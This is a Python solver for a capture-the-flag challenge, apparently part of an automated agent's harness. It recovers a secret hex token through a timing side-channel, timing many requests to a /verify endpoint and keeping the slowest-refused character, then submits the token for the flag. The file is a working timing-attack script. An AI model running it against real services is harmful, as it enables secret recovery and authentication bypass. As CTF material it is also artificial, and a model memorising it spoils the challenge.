"""
Puzzle 5 — Pythia's Whisper (Crypto / Side-Channel, 150 pts)

The Oracle holds a 20-char lowercase-hex token (0-9a-f). POST /verify
{"token": "..."} — a wrong guess is refused, but the server's comparison stops at
the FIRST wrong character, so a guess with more correct leading characters takes
measurably LONGER to be refused. Classic non-constant-time compare.

Attack (byte-at-a-time timing oracle):
  - Build the token one hex char at a time, left to right.
  - For each position, try all 16 hex chars appended to the known prefix, pad the
    rest with a fixed filler, and time /verify many times.
  - The char whose median (robust to network noise) time is highest is correct —
    it made the compare advance one more position before failing.
  - Repeat for all 20 positions, then submit the full token to get the flag.

Hint 4/5: one sample is unreliable (network noise) -> many samples + median.
Positional build-up means we only ever brute 16 options per slot, not 16^20.

Env: HAL_TARGET_IP/_PORT.
"""
import statistics
import time
from typing import List, Optional

from ._http import discover_base, find_flag, post

HEX = "0123456789abcdef"
TOKEN_LEN = 20


class PythiaSolver:
    def __init__(self, agent):
        self.agent = agent
        self.base: Optional[str] = None
        self.verify_url: str = ""
        self.token_len = TOKEN_LEN
        # Samples per candidate. More = more robust vs noise but slower. Tuned to
        # stay well inside the 1h run cap: 20 pos * 16 chars * SAMPLES requests.
        self.samples = 12

    def solve(self) -> bool:
        print("=== Pythia's Whisper Solver (timing side-channel) ===", flush=True)
        self.base = discover_base(self.agent.target_ip, self.agent.target_port)
        if not self.base:
            return False
        self.verify_url = f"{self.base}/verify"

        # Confirm the timing signal exists and calibrate sample count.
        if not self._calibrate():
            print("Timing signal weak/absent — proceeding anyway with more samples.", flush=True)
            self.samples = 20

        known = ""
        for pos in range(self.token_len):
            best_char, timings = self._recover_char(known)
            known += best_char
            print(f"[pos {pos + 1}/{self.token_len}] -> {best_char!r} | "
                  f"prefix={known!r} | medians={self._fmt(timings)}", flush=True)
            # Opportunistic: some oracles accept a correct prefix early / leak flag.
            if len(known) >= 4 and self._verify_returns_flag(known):
                return True

        print(f"Recovered token: {known}", flush=True)
        return self._submit_token(known)

    def _calibrate(self) -> bool:
        """Compare timing of an all-wrong guess vs. guesses — if the spread across
        first-char candidates exceeds noise, the oracle leaks. Best-effort."""
        base_timings = self._time_candidates("")
        if not base_timings:
            return False
        meds = sorted(base_timings.values())
        spread = meds[-1] - meds[0]
        median_noise = statistics.median(meds)
        print(f"Calibration: spread={spread * 1000:.2f}ms over median~{median_noise * 1000:.2f}ms", flush=True)
        return spread > 0  # any measurable spread is usable with medians

    def _recover_char(self, prefix: str):
        timings = self._time_candidates(prefix)
        # Highest median time = compare advanced furthest = correct char.
        best = max(timings, key=lambda c: timings[c])
        return best, timings

    def _time_candidates(self, prefix: str) -> dict:
        """For each hex char c, time /verify on prefix+c padded to full length.
        Returns {char: median_seconds}. Interleaves samples to spread noise evenly
        across candidates rather than clustering it on one."""
        samples_by_char = {c: [] for c in HEX}
        pad_char = "0"
        for _ in range(self.samples):
            for c in HEX:
                guess = prefix + c
                guess = guess + pad_char * (self.token_len - len(guess))
                dt = self._timed_verify(guess)
                if dt is not None:
                    samples_by_char[c].append(dt)
        return {c: (statistics.median(v) if v else 0.0) for c, v in samples_by_char.items()}

    def _timed_verify(self, token: str) -> Optional[float]:
        start = time.perf_counter()
        resp = post(self.verify_url, {"token": token}, log=False)
        dt = time.perf_counter() - start
        if resp is None:
            return None
        # If we ever get an accept, capture it immediately.
        if find_flag(resp.text):
            self._found_flag = find_flag(resp.text)
        return dt

    def _verify_returns_flag(self, token_prefix: str) -> bool:
        # Try the exact prefix (some oracles unlock on correct-so-far); harmless.
        resp = post(self.verify_url, {"token": token_prefix})
        if resp is None:
            return False
        flag = find_flag(resp.text)
        if flag:
            return self.agent.submit_flag(flag, self.agent.challenge_id)
        return False

    def _submit_token(self, token: str) -> bool:
        resp = post(self.verify_url, {"token": token})
        if resp is None:
            return False
        flag = find_flag(resp.text)
        if flag:
            return self.agent.submit_flag(flag, self.agent.challenge_id)
        print(f"Full token {token!r} did not return a flag. If off by a char, the "
              f"per-position medians in the log show close runner-ups to retry.", flush=True)
        return False

    @staticmethod
    def _fmt(timings: dict) -> str:
        top = sorted(timings.items(), key=lambda kv: kv[1], reverse=True)[:3]
        return ", ".join(f"{c}={t * 1000:.1f}ms" for c, t in top)

    @staticmethod
    def _timings_list(timings: dict) -> List[float]:
        return list(timings.values())
